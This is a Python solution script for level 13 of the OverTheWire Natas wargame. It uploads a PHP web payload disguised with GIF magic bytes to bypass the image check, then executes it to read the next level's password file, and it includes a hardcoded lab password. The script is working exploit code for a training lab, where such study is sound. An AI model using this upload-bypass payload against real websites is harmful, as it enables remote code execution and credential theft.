import requests
from bs4 import BeautifulSoup

URL = 'http://natas13.natas.labs.overthewire.org/'
AUTH = ('natas13', 'trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC')  # Update with your password for natas13

# GIF header (magic bytes) + PHP payload
gif_php_payload = b'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>'

def exploit():
    with requests.Session() as session:
        session.auth = AUTH

        # Prepare file and form data
        files = {'uploadedfile': ('exploit.php', gif_php_payload, 'image/gif')}
        data = {'filename': 'exploit.php', 'MAX_FILE_SIZE': '1000'}

        # Upload the file
        response = session.post(URL, files=files, data=data)
        response.raise_for_status()

        # Parse response for the uploaded file's URL
        soup = BeautifulSoup(response.text, 'html.parser')
        link = soup.find('a', href=True)
        if not link:
            print("[-] Upload failed or file link not found.")
            return

        uploaded_url = URL + link['href']
        print(f"[+] Uploaded file: {uploaded_url}")

        # Request the uploaded file to execute the PHP payload
        result = session.get(uploaded_url)
        result.raise_for_status()
        print(f"[+] Natas14 password: {result.text.strip()}")

if __name__ == "__main__":
    exploit()
